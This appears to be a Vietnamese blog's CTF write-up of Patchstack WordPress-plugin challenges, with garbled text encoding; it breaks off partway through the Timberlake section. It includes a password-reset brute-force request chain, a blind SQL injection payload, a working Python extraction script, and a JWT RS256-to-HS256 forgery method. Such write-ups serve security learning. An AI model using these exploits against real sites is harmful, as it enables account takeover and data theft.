<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Writeup Patchstack WCUS CTF | minhtuanact|Blog - Keep a flame in the rain!</title><meta name=keywords content="WriteUp,CTF,ContentCreator"><meta name=description content="Trong thá»i gian gáº§n Ä‘Ã¢y, Patchstack Ä‘Ã£ tá»• chá»©c cuá»™c thi Patchstack WCUS CTF, bao gá»“m 9 thá»­ thÃ¡ch (challenge), táº¥t cáº£ Ä‘á»u táº­p trung vÃ o viá»‡c khai thÃ¡c cÃ¡c lá»— há»•ng báº£o máº­t trong cÃ¡c plugin WordPress. Sau Ä‘Ã¢y lÃ  má»™t sá»‘ writeup vá» cÃ¡c thá»­ thÃ¡ch Ä‘Ã³.
Táº¥t cáº£ cÃ¡c challenge Ä‘á»u Ä‘Æ°á»£c cung cáº¥p dÆ°á»›i dáº¡ng whitebox.
WP Elevator Trong challenge nÃ y, Ä‘á» bÃ i cung cáº¥p cho chÃºng ta má»™t plugin WordPress."><meta name=author content="minhtuanact"><link rel=canonical href=https://minhtuanact.github.io/posts/writeup-patchstack-wcus-ctf/><meta name=google-site-verification content="minhtuanact"><meta name=yandex-verification content="minhtuanact"><meta name=msvalidate.01 content="minhtuanact"><link crossorigin=anonymous href=/assets/css/stylesheet.bc1149f4a72aa4858d3a9f71462f75e5884ffe8073ea9d6d5761d5663d651e20.css integrity="sha256-vBFJ9KcqpIWNOp9xRi915YhP/oBz6p1tV2HVZj1lHiA=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=icon type=image/png sizes=16x16 href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=icon type=image/png sizes=32x32 href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=apple-touch-icon href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=mask-icon href=https://minhtuanact.github.io/cat-icon-png-3.png><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,o,i,a,t,n,s){e.GoogleAnalyticsObject=t,e[t]=e[t]||function(){(e[t].q=e[t].q||[]).push(arguments)},e[t].l=1*new Date,n=o.createElement(i),s=o.getElementsByTagName(i)[0],n.async=1,n.src=a,s.parentNode.insertBefore(n,s)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="Writeup Patchstack WCUS CTF"><meta property="og:description" content="Trong thá»i gian gáº§n Ä‘Ã¢y, Patchstack Ä‘Ã£ tá»• chá»©c cuá»™c thi Patchstack WCUS CTF, bao gá»“m 9 thá»­ thÃ¡ch (challenge), táº¥t cáº£ Ä‘á»u táº­p trung vÃ o viá»‡c khai thÃ¡c cÃ¡c lá»— há»•ng báº£o máº­t trong cÃ¡c plugin WordPress. Sau Ä‘Ã¢y lÃ  má»™t sá»‘ writeup vá» cÃ¡c thá»­ thÃ¡ch Ä‘Ã³.
Táº¥t cáº£ cÃ¡c challenge Ä‘á»u Ä‘Æ°á»£c cung cáº¥p dÆ°á»›i dáº¡ng whitebox.
WP Elevator Trong challenge nÃ y, Ä‘á» bÃ i cung cáº¥p cho chÃºng ta má»™t plugin WordPress."><meta property="og:type" content="article"><meta property="og:url" content="https://minhtuanact.github.io/posts/writeup-patchstack-wcus-ctf/"><meta property="og:image" content="https://minhtuanact.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-09-21T16:28:54+07:00"><meta property="article:modified_time" content="2024-09-21T16:28:54+07:00"><meta property="og:site_name" content="minhtuanact|Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://minhtuanact.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="Writeup Patchstack WCUS CTF"><meta name=twitter:description content="Trong thá»i gian gáº§n Ä‘Ã¢y, Patchstack Ä‘Ã£ tá»• chá»©c cuá»™c thi Patchstack WCUS CTF, bao gá»“m 9 thá»­ thÃ¡ch (challenge), táº¥t cáº£ Ä‘á»u táº­p trung vÃ o viá»‡c khai thÃ¡c cÃ¡c lá»— há»•ng báº£o máº­t trong cÃ¡c plugin WordPress. Sau Ä‘Ã¢y lÃ  má»™t sá»‘ writeup vá» cÃ¡c thá»­ thÃ¡ch Ä‘Ã³.
Táº¥t cáº£ cÃ¡c challenge Ä‘á»u Ä‘Æ°á»£c cung cáº¥p dÆ°á»›i dáº¡ng whitebox.
WP Elevator Trong challenge nÃ y, Ä‘á» bÃ i cung cáº¥p cho chÃºng ta má»™t plugin WordPress."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://minhtuanact.github.io/posts/"},{"@type":"ListItem","position":2,"name":"Writeup Patchstack WCUS CTF","item":"https://minhtuanact.github.io/posts/writeup-patchstack-wcus-ctf/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Writeup Patchstack WCUS CTF","name":"Writeup Patchstack WCUS CTF","description":"Trong thá»i gian gáº§n Ä‘Ã¢y, Patchstack Ä‘Ã£ tá»• chá»©c cuá»™c thi Patchstack WCUS CTF, bao gá»“m 9 thá»­ thÃ¡ch (challenge), táº¥t cáº£ Ä‘á»u táº­p trung vÃ o viá»‡c khai thÃ¡c cÃ¡c lá»— há»•ng báº£o máº­t trong cÃ¡c plugin WordPress. Sau Ä‘Ã¢y lÃ  má»™t sá»‘ writeup vá» cÃ¡c thá»­ thÃ¡ch Ä‘Ã³.\nTáº¥t cáº£ cÃ¡c challenge Ä‘á»u Ä‘Æ°á»£c cung cáº¥p dÆ°á»›i dáº¡ng whitebox.\nWP Elevator Trong challenge nÃ y, Ä‘á» bÃ i cung cáº¥p cho chÃºng ta má»™t plugin WordPress.","keywords":["WriteUp","CTF","ContentCreator"],"articleBody":"Trong thá»i gian gáº§n Ä‘Ã¢y, Patchstack Ä‘Ã£ tá»• chá»©c cuá»™c thi Patchstack WCUS CTF, bao gá»“m 9 thá»­ thÃ¡ch (challenge), táº¥t cáº£ Ä‘á»u táº­p trung vÃ o viá»‡c khai thÃ¡c cÃ¡c lá»— há»•ng báº£o máº­t trong cÃ¡c plugin WordPress. Sau Ä‘Ã¢y lÃ  má»™t sá»‘ writeup vá» cÃ¡c thá»­ thÃ¡ch Ä‘Ã³.\nTáº¥t cáº£ cÃ¡c challenge Ä‘á»u Ä‘Æ°á»£c cung cáº¥p dÆ°á»›i dáº¡ng whitebox.\nWP Elevator Trong challenge nÃ y, Ä‘á» bÃ i cung cáº¥p cho chÃºng ta má»™t plugin WordPress. Nhiá»‡m vá»¥ cá»§a chÃºng ta lÃ  gá»i Ä‘Ãºng endpoint Ä‘á»ƒ láº¥y Ä‘Æ°á»£c flag.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  add_action(\"wp_ajax_patchstack_flagger\", \"flagger_request_callback\"); function flagger_request_callback() { // Validate nonce  $nonce = isset($_REQUEST[\"nonce\"]) ? sanitize_text_field($_REQUEST[\"nonce\"]) : \"\"; if (!wp_verify_nonce($nonce, \"get_latest_posts_nonce\")) { wp_send_json_error(\"Invalid nonce.\"); return; } $user = wp_get_current_user(); $allowed_roles = [\"administrator\", \"subscriber\"]; if (array_intersect($allowed_roles, $user-roles)) { $value = file_get_contents('/flag.txt'); wp_send_json_success([\"value\" = $value]); } else { wp_send_json_error(\"Missing permission.\"); } }   Váº­y, chá»‰ cáº§n chÃºng ta cÃ³ Ä‘Æ°á»£c role administrator hoáº·c subscriber, chÃºng ta sáº½ nháº­n Ä‘Æ°á»£c flag.\nNhÆ°ng lÃ m tháº¿ nÃ o Ä‘á»ƒ cÃ³ thá»ƒ Ä‘Äƒng kÃ½ má»™t tÃ i khoáº£n subscriber? Trong mÃ£ nguá»“n, cÃ³ má»™t Ä‘oáº¡n code cho phÃ©p táº¡o ngÆ°á»i dÃ¹ng má»›i vá»›i role subscriber.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  function create_user_via_api($request) { $parameters = $request-get_json_params(); $username = sanitize_text_field($parameters[\"username\"]); $email = sanitize_email($parameters[\"email\"]); $password = wp_generate_password(); // Create user  $user_id = wp_create_user($username, $password, $email); if (is_wp_error($user_id)) { return new WP_Error( \"user_creation_failed\", __(\"User creation failed.\", \"text_domain\"), [\"status\" = 500] ); } // Add user role  $user = new WP_User($user_id); $user-set_role(\"subscriber\"); return [ \"message\" = __(\"User created successfully.\", \"text_domain\"), \"user_id\" = $user_id, ]; }   YÃªu cáº§u POST Ä‘á»ƒ táº¡o tÃ i khoáº£n má»›i:\n1 2 3 4 5 6 7  POST /wp-json/user/v1/create HTTP/1.1 Content-Type: application/json { \"username\": \"newuser\", \"email\": \"newuser@example.com\" }   Tuy nhiÃªn, khi táº¡o ngÆ°á»i dÃ¹ng má»›i, chá»‰ cÃ³ username vÃ  email Ä‘Æ°á»£c truyá»n Ä‘i, mÃ  khÃ´ng cÃ³ máº­t kháº©u Ä‘á»ƒ Ä‘Äƒng nháº­p. Plugin nÃ y cÃ²n cung cáº¥p má»™t tÃ­nh nÄƒng khÃ¡c lÃ  reset_password_key_callback(), cho phÃ©p yÃªu cáº§u reset máº­t kháº©u cho báº¥t ká»³ tÃ i khoáº£n nÃ o. ChÃºng ta cÃ³ thá»ƒ sá»­ dá»¥ng $key Ä‘Æ°á»£c táº¡o tá»« get_password_reset_key2() Ä‘á»ƒ thá»±c hiá»‡n viá»‡c reset máº­t kháº©u.\nRequest yÃªu cáº§u reset password:\n1 2 3 4  POST /wp-admin/admin-ajax.php HTTP/1.1 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 action=reset_key\u0026user_id=71   Tuy nhiÃªn, $key Ä‘Æ°á»£c táº¡o ra chá»‰ cÃ³ 1 kÃ½ tá»± duy nháº¥t, Ä‘iá»u nÃ y cho phÃ©p chÃºng ta brute force key Ä‘á»ƒ reset máº­t kháº©u cho tÃ i khoáº£n subscriber vá»«a táº¡o.\n1  $key = wp_generate_password(1, false);   Do mÃ´i trÆ°á»ng cá»§a tÃ´i khÃ´ng Ä‘Æ°á»£c cáº¥u hÃ¬nh server mail, nÃªn tÃ´i gáº·p khÃ³ khÄƒn trong viá»‡c xÃ¡c Ä‘á»‹nh chÃ­nh xÃ¡c endpoint Ä‘á»ƒ reset máº­t kháº©u báº±ng key. Sau khi tham kháº£o ChatGPT, tÃ´i Ä‘Ã£ nháº­n Ä‘Æ°á»£c cÃ¢u tráº£ lá»i nhÆ° sau:\nTÃ´i Ä‘Ã£ thá»­ sá»­ dá»¥ng endpoint nÃ y Ä‘á»ƒ reset máº­t kháº©u cho tÃ i khoáº£n subscriber.Tuy nhiÃªn, sau Ä‘Ã³ tÃ´i phÃ¡t hiá»‡n ra má»™t endpoint tá»‘t hÆ¡n Ä‘á»ƒ thá»±c hiá»‡n viá»‡c nÃ y.\n1 2 3 4  POST /wp-login.php?action=resetpass HTTP/1.1 Content-Type: application/x-www-form-urlencoded pass1=123\u0026pw_weak=on\u0026pass2=123\u0026rp_key=R\u0026wp-submit=Save+Password   Sau khi reset thÃ nh cÃ´ng vÃ  cÃ³ Ä‘Æ°á»£c tÃ i khoáº£n subscriber, tÃ´i tiáº¿p tá»¥c gá»­i yÃªu cáº§u Ä‘áº¿n hÃ m get_latest_posts_callback Ä‘á»ƒ láº¥y giÃ¡ trá»‹ nonce:\n1 2 3 4 5  POST /wp-admin/admin-ajax.php HTTP/1.1 Content-Type: application/x-www-form-urlencoded Cookie:  action=get_latest_posts_callback   Khi Ä‘Ã£ cÃ³ nonce, tÃ´i chá»‰ cáº§n gá»­i yÃªu cáº§u tá»›i flagger_request_callback() vÃ  truyá»n giÃ¡ trá»‹ nonce Ä‘Ã³ Ä‘á»ƒ nháº­n flag:\n1 2 3 4 5  POST /wp-admin/admin-ajax.php HTTP/1.1 Cookie:  Content-Type: application/x-www-form-urlencoded action=patchstack_flagger\u0026nonce=b920667f1a   Link Manager Äáº­p vÃ o máº¯t Ä‘áº§u tiÃªn lÃ  Ä‘oáº¡n code dá»… dÃ ng bá»‹ khai thÃ¡c SQL Injection táº¡i:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  function get_link_data() { global $wpdb; $table_name = $wpdb-prefix . 'links'; $link_name = sanitize_text_field($_POST['link_name']); $order = sanitize_text_field($_POST['order']); $orderby = sanitize_text_field($_POST['orderby']); validate_order($order); validate_order_by($orderby); $results = $wpdb-get_results(\"SELECT * FROM wp_links where link_name = '$link_name' order by $orderby$order\"); if (!empty($results)) { wp_send_json_success($results); } else { wp_send_json_error('No data found.'); } }   Máº·c dÃ¹ cÃ³ Ä‘oáº¡n validate dá»¯ liá»‡u truyá»n vÃ o, nhÆ°ng nÃ³ chá»‰ Ä‘á»ƒ Ä‘Ã¡nh lá»«a vÃ  khÃ´ng thá»±c sá»± ngÄƒn cháº·n Ä‘Æ°á»£c SQL Injection. ChÃºng ta váº«n cÃ³ thá»ƒ khai thÃ¡c lá»— há»•ng qua biáº¿n $orderby $order.\nÄá»ƒ khai thÃ¡c Ä‘Æ°á»£c lá»— há»•ng nÃ y, trÆ°á»›c tiÃªn cáº§n thÃªm dá»¯ liá»‡u vÃ o mÃ  khÃ´ng cáº§n xÃ¡c thá»±c thÃ´ng qua hook sau:\n1  add_action( 'wp_ajax_nopriv_submit_link', 'handle_ajax_link_submission' );   ChÃºng ta cÃ³ thá»ƒ gá»­i yÃªu cáº§u thÃªm dá»¯ liá»‡u vÃ  láº¥y giÃ¡ trá»‹ nonce tá»« trang chá»§, thÃ´ng qua biáº¿n var ajaxNonce = 'bb01b00013';:\n1 2 3 4  POST /wp-admin/admin-ajax.php HTTP/1.1 Content-Type: application/x-www-form-urlencoded action=submit_link\u0026url=http://example.com\u0026name=test\u0026description=test\u0026nonce=bb01b00013   Khai thÃ¡c SQL Injection Trong Ä‘oáº¡n truy váº¥n SQL sau:\n1  $results = $wpdb-get_results(\"SELECT * FROM wp_links where link_name = '$link_name' order by $orderby$order\");   ChÃºng ta cÃ³ thá»ƒ khai thÃ¡c SQL Injection qua order by, nhÆ°ng do response khÃ´ng hiá»ƒn thá»‹ lá»—i nÃªn khÃ´ng thá»ƒ sá»­ dá»¥ng ká»¹ thuáº­t error-based SQLi. Thay vÃ o Ä‘Ã³, cÃ³ hai cÃ¡ch khai thÃ¡c: time-based blind SQL Injection hoáº·c boolean-based blind SQL Injection.\nTÃ´i Ä‘Ã£ chá»n cÃ¡ch khai thÃ¡c báº±ng boolean-based blind SQL Injection vÃ¬ cÃ¡ch nÃ y nhanh hÆ¡n cho brute force. Payload sá»­ dá»¥ng cÃ³ dáº¡ng (cáº£m Æ¡n ngÆ°á»i anh homie Ä‘Ã£ chia sáº» payload nÃ y):\n1  (SELECT(CASEWHEN(1=1)THEN1ELSE6096*(SELECT6096FROMinformation_schema.tables)END))  Chá»‰ cáº§n thay pháº§n 1=1 báº±ng cÃ¡c Ä‘iá»u kiá»‡n boolean hoáº·c time-based khÃ¡c lÃ  Ä‘Æ°á»£c. TÃ´i Ä‘Ã£ chá»n sá»­ dá»¥ng boolean-based vÃ¬ nÃ³ hiá»‡u quáº£ hÆ¡n trong trÆ°á»ng há»£p nÃ y.\n LÆ°u Ã½: CÃ´ng cá»¥ sqlmap khÃ´ng thá»ƒ khai thÃ¡c lá»— há»•ng nÃ y do háº¡n cháº¿ trong viá»‡c gá»­i payload. Náº¿u cÃ³ cÃ¡ch sá»­ dá»¥ng tá»‘t hÆ¡n, cÃ¡c báº¡n Ä‘á»c cÃ³ thá»ƒ gá»£i Ã½ thÃªm nhÃ©. VÃ¬ khÃ´ng thá»ƒ khai thÃ¡c tá»± Ä‘á»™ng báº±ng cÃ´ng cá»¥, tÃ´i Ä‘Ã nh pháº£i â€œmanualâ€ ğŸ˜¥.\n Trong quÃ¡ trÃ¬nh khai thÃ¡c, tÃ´i gáº·p hai váº¥n Ä‘á» lá»›n:\n KhÃ´ng thá»ƒ sá»­ dá»¥ng dáº¥u '. KhÃ´ng thá»ƒ so sÃ¡nh chuá»—i.  NguyÃªn nhÃ¢n khÃ´ng sá»­ dá»¥ng Ä‘Æ°á»£c dáº¥u ' lÃ  do tÃ­nh nÄƒng Addslashes cá»§a WordPress mÃ  tÃ´i Ä‘Ã£ trÃ¬nh bÃ y trong bÃ i viáº¿t trÆ°á»›c. Viá»‡c nÃ y cÅ©ng khiáº¿n khÃ´ng thá»ƒ so sÃ¡nh chuá»—i má»™t cÃ¡ch thÃ´ng thÆ°á»ng.\nGiáº£i phÃ¡p thay tháº¿ lÃ  sá»­ dá»¥ng cÃ¡c hÃ m sá»‘ Ä‘á»ƒ so sÃ¡nh. TÃ´i chuyá»ƒn qua so sÃ¡nh báº±ng sá»‘ vÃ  sá»­ dá»¥ng hÃ m ASCII() Ä‘á»ƒ chuyá»ƒn Ä‘á»•i kÃ½ tá»± sang mÃ£ sá»‘, Ä‘á»“ng thá»i sá»­ dá»¥ng hÃ m CHAR() Ä‘á»ƒ láº¥y tÃªn cá»™t. Flag cá»§a challenge nÃ y náº±m trong báº£ng wp_options vá»›i tÃªn cá»™t lÃ  flag_links_data.\nVá»›i sá»± há»— trá»£ cá»§a ChatGPT, tÃ´i Ä‘Ã£ viáº¿t má»™t script Ä‘á»ƒ khai thÃ¡c lá»— há»•ng nÃ y:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45  import requests import string url = 'http://100.25.255.51:9097/wp-admin/admin-ajax.php' target_table = '' def test_sqli(payload): data = { 'action': 'get_link_data', 'link_name': 'test', 'order': '', 'orderby': payload } headers = { 'Content-Type': 'application/x-www-form-urlencoded' } response = requests.post(url, data=data, headers=headers) try: result = response.json() if result.get('success') == False: return False return True except ValueError: return False def brute_force_flag_links_data(): flag_value = '' char_set = string.ascii_letters + string.digits + string.punctuation while True: found = False for char in range(32, 127): payload = f\"(SELECT (CASE WHEN (SELECT ASCII(SUBSTRING(option_value,{len(flag_value)+1},1)) FROM wordpress.wp_options WHERE option_name=CHAR(102,108,97,103,95,108,105,110,107,115,95,100,97,116,97)) = {char}THEN 1 ELSE 6096*(SELECT 6096 FROM information_schema.tables) END))\" if test_sqli(payload): flag_value += chr(char) print(f\"ÄÃ£ tÃ¬m tháº¥y: {flag_value}\") found = True break if not found: break print(f\"GiÃ¡ trá»‹ flag_links_data lÃ : {flag_value}\") brute_force_flag_links_data()   JustinWonkyTokens Äá» bÃ i cung cáº¥p má»™t plugin sá»­ dá»¥ng JWT (JSON Web Token) Ä‘á»ƒ xÃ¡c thá»±c, vÃ  nhiá»‡m vá»¥ cá»§a chÃºng ta lÃ  láº¥y Ä‘Æ°á»£c JWT vá»›i role=admin Ä‘á»ƒ cÃ³ Ä‘Æ°á»£c flag.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  function simple_jwt_handler() { $flag = file_get_contents('/flag.txt'); $privateKey = file_get_contents('/jwt.key'); $publicKey = EOD-----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqXfQ7ExnjmPJbSwuFoxw 3kuBeE716YM5uXirwUb0OWB5RfACAx9yulBQJorcQIUdeRf+YpkQU5U8h3jVyeqw HzjOjNjM00CVFeogTnueHoose7Jcdi/K3NyYcFQINui7b6cGab8hMl6SgctwZu1l G0bk0VcqgafWFqSfIYZYw57GYhMnfPe7OR0Cvv1HBCD2nWYilDp/Hq3WUkaMWGsG UBMSNpC2C/3CzGOBV8tHWAUA8CFI99dHckMZCFJlKMWNQUQlTlF3WB1PnDNL4EPY YC+8DqJDSLCvFwI+DeqXG4B/DIYdJyhEgMdZfAKSbMJtsanOVjBLJx4hrNS42RNU dwIDAQAB -----END PUBLIC KEY----- EOD; $issuedAt = new DateTimeImmutable(); $data = [ \"role\" = \"guest\", \"iat\" = $issuedAt-getTimestamp(), \"nbf\" = $issuedAt-getTimestamp() ]; if (!isset($_COOKIE['simple_jwt'])) { setcookie('simple_jwt', SimpleJWTHandler::encodeToken($data, $privateKey, 'RS256')); echo 'JWT has been set.'; } else { $token = $_COOKIE['simple_jwt']; try { $decoded = SimpleJWTHandler::decodeToken($token, $publicKey); if ($decoded-role == 'admin') { echo 'Success: ' . $flag; } elseif ($decoded-role == 'guest') { echo 'Role is guest.'; } } catch (Exception $e) { echo 'Token verification failed.'; } } }   Khi gá»­i yÃªu cáº§u tá»›i wp-ajax.php vá»›i action=simple_jwt_handler, náº¿u khÃ´ng cÃ³ giÃ¡ trá»‹ $_COOKIE['simple_jwt'], plugin sáº½ tráº£ vá» má»™t JWT vá»›i role=guest, Ä‘Æ°á»£c mÃ£ hÃ³a báº±ng thuáº­t toÃ¡n RS256. Do chÃºng ta khÃ´ng biáº¿t Ä‘Æ°á»£c private.key, nÃªn viá»‡c chá»‰nh sá»­a JWT Ä‘á»ƒ chuyá»ƒn tá»« role=guest sang role=admin lÃ  khÃ´ng kháº£ thi.\nTiáº¿p theo, hÃ£y kiá»ƒm tra hÃ m SimpleJWTHandler::decodeToken($token, $publicKey):\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  public static function decodeToken($token, $key = null, $verify = true) { $segments = explode('.', $token); if (count($segments) != 3) { throw new UnexpectedValueException('Invalid token structure'); } list($header64, $payload64, $signature64) = $segments; $header = self::jsonDecode(self::urlSafeBase64Decode($header64)); $payload = self::jsonDecode(self::urlSafeBase64Decode($payload64)); $signature = self::urlSafeBase64Decode($signature64); if ($verify) { if (empty($header-alg)) { throw new DomainException('Algorithm missing'); } if (is_array($key)) { if (isset($header-kid)) { $key = $key[$header-kid]; } else { throw new DomainException('Key ID missing'); } } if (!self::verifySignature(\"$header64.$payload64\", $signature, $key, $header-alg)) { throw new UnexpectedValueException('Signature verification failed'); } if (isset($payload-exp) \u0026\u0026 time() = $payload-exp) { throw new UnexpectedValueException('Token expired'); } } return $payload; }   ChÃºng ta tháº¥y ráº±ng hÃ m decodeToken sá»­ dá»¥ng $token vÃ  $publicKey Ä‘á»ƒ xÃ¡c thá»±c JWT. Tuy nhiÃªn, cÃ³ má»™t lá»— há»•ng á»Ÿ Ä‘Ã¢y: thuáº­t toÃ¡n mÃ£ hÃ³a JWT (alg) khÃ´ng Ä‘Æ°á»£c cá»‘ Ä‘á»‹nh mÃ  Ä‘Æ°á»£c láº¥y tá»« header cá»§a JWT mÃ  ngÆ°á»i dÃ¹ng gá»­i vÃ o. Äiá»u nÃ y cho phÃ©p chÃºng ta thay Ä‘á»•i thuáº­t toÃ¡n mÃ£ hÃ³a tá»« RS256 sang HS256. Vá»›i HS256, JWT sáº½ sá»­ dá»¥ng publicKey cá»§a server lÃ m khÃ³a bÃ­ máº­t Ä‘á»ƒ mÃ£ hÃ³a thay vÃ¬ privateKey.\nÄiá»u nÃ y cÃ³ nghÄ©a lÃ  chÃºng ta cÃ³ thá»ƒ giáº£ máº¡o JWT vá»›i role=admin báº±ng cÃ¡ch sá»­ dá»¥ng thuáº­t toÃ¡n HS256 vÃ  kÃ½ láº¡i JWT báº±ng publicKey mÃ  server Ä‘Ã£ cung cáº¥p.\nVá»›i lá»— há»•ng Ä‘Ã£ phÃ¡t hiá»‡n, chÃºng ta chá»‰ cáº§n chá»‰nh sá»­a má»™t chÃºt á»Ÿ pháº§n mÃ£ hÃ³a JWT Ä‘á»ƒ cÃ³ thá»ƒ táº¡o ra má»™t JWT vá»›i role=admin. Thay vÃ¬ sá»­ dá»¥ng thuáº­t toÃ¡n RS256, chÃºng ta sáº½ chuyá»ƒn sang sá»­ dá»¥ng HS256 vÃ  kÃ½ láº¡i JWT báº±ng publicKey mÃ  server Ä‘Ã£ cung cáº¥p.\nDÆ°á»›i Ä‘Ã¢y lÃ  Ä‘oáº¡n code Ä‘Ã£ Ä‘Æ°á»£c chá»‰nh sá»­a:\n1 2 3 4 5 6 7 8 9 10  $data = [ \"role\" = \"admin\", \"iat\" = $issuedAt-getTimestamp(), \"nbf\" = $issuedAt-getTimestamp() ]; if (!isset($_COOKIE['simple_jwt'])) { setcookie('simple_jwt', SimpleJWTHandler::encodeToken($data, $publicKey, 'HS256')); echo 'JWT has been set.'; }   Vá»›i Ä‘oáº¡n mÃ£ nÃ y, chÃºng ta Ä‘Ã£ táº¡o Ä‘Æ°á»£c má»™t JWT vá»›i role=admin, sá»­ dá»¥ng thuáº­t toÃ¡n HS256 vÃ  publicKey tá»« server Ä‘á»ƒ kÃ½ láº¡i JWT. Sau khi cÃ³ Ä‘Æ°á»£c JWT nÃ y tá»« mÃ´i trÆ°á»ng local, chá»‰ cáº§n gá»­i JWT lÃªn server báº±ng cÃ¡ch Ä‘Ã­nh kÃ¨m nÃ³ vÃ o Cookie, vÃ  gá»­i má»™t request tá»›i server. Náº¿u token Ä‘Ã£ Ä‘Æ°á»£c chá»‰nh sá»­a Ä‘Ãºng cÃ¡ch, server sáº½ xÃ¡c thá»±c JWT vá»›i role=admin vÃ  tráº£ vá» flag.\nCá»¥ thá»ƒ, sau khi cÃ³ JWT, báº¡n chá»‰ cáº§n POST nÃ³ lÃªn server thÃ´ng qua:\n1 2  POST /wp-ajax.php?action=simple_jwt_handler HTTP/1.1 Cookie: simple_jwt=   Váº­y lÃ  báº¡n sáº½ nháº­n Ä‘Æ°á»£c flag\nTimberlake Äá» bÃ i cung cáº¥p má»™t theme WordPress vá»›i file index.php Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ hiá»ƒn thá»‹ ná»™i dung trang. á» pháº§n nÃ y, Ä‘iá»ƒm cáº§n chÃº Ã½ lÃ  tham sá»‘ page Ä‘Æ°á»£c truyá»n qua URL, vÃ  sau Ä‘Ã³ ná»™i dung Ä‘Æ°á»£c render thÃ´ng qua Timber::render($page, $context). Tuy nhiÃªn, Ä‘á»ƒ cÃ³ thá»ƒ render file template thÃ nh cÃ´ng, tham sá»‘ page pháº£i qua hÃ m validate($_REQUEST['page']). DÆ°á»›i Ä‘Ã¢y, tÃ´i sáº½ giáº£i thÃ­ch chi tiáº¿t hÆ¡n cÃ¡c bÆ°á»›c xá»­ lÃ½ vÃ  cÃ¡c cÆ¡ cháº¿ báº£o vá»‡ cá»§a Ä‘oáº¡n mÃ£ nÃ y.\nGiáº£i thÃ­ch chi tiáº¿t cÃ¡c pháº§n quan trá»ng:   CÆ¡ cháº¿ xÃ¡c Ä‘á»‹nh template:\n1 2 3 4  $page = 'template-home.twig'; if(isset($_REQUEST['page']) \u0026\u0026 validate($_REQUEST['page'])){ $page = $_REQUEST['page']; };   Trong Ä‘oáº¡n nÃ y, biáº¿n $page sáº½ nháº­n giÃ¡ trá»‹ tá»« tham sá»‘ page trong request náº¿u hÃ m validate() tráº£ vá» true. Náº¿u khÃ´ng, máº·c Ä‘á»‹nh template Ä‘Æ°á»£c sá»­ dá»¥ng lÃ  template-home.twig. Äiá»u nÃ y cÃ³ nghÄ©a ráº±ng Ä‘á»ƒ render má»™t file khÃ¡c, giÃ¡ trá»‹ cá»§a tham sá»‘ page pháº£i thá»a mÃ£n cÃ¡c Ä‘iá»u kiá»‡n kiá»ƒm tra trong hÃ m validate().\n  HÃ m validate(): ÄÃ¢y lÃ  hÃ m kiá»ƒm tra quan trá»ng Ä‘á»ƒ Ä‘áº£m báº£o file Ä‘Æ°á»£c truyá»n qua tham sá»‘ page an toÃ n vÃ  há»£p lá»‡. CÃ¡c bÆ°á»›c kiá»ƒm tra bao gá»“m:\n  Kiá»ƒm tra tÃªn file:\n1  if (isset($filename) \u0026\u0026 !empty($filename) \u0026\u0026 !in_array($filename, array('.php', '.htm', '.html', '.phtml', '.xhtml'))) {   TÃªn file pháº£i khÃ´ng rá»—ng vÃ  khÃ´ng Ä‘Æ°á»£c náº±m trong danh sÃ¡ch cÃ¡c file cÃ³ pháº§n má»Ÿ rá»™ng nguy hiá»ƒm nhÆ° .php, .htm, .html, v.v. Äiá»u nÃ y giÃºp ngÄƒn cháº·n viá»‡c sá»­ dá»¥ng cÃ¡c file cÃ³ kháº£ nÄƒng thá»±c thi mÃ£ Ä‘á»™c.\n  Kiá»ƒm tra ná»™i dung file:\n1 2 3 4 5  if(is_timber_template(file_get_contents($fullPath)) === true) { if(is_valid_template(file_get_contents($fullPath)) === true) { return 1; } }   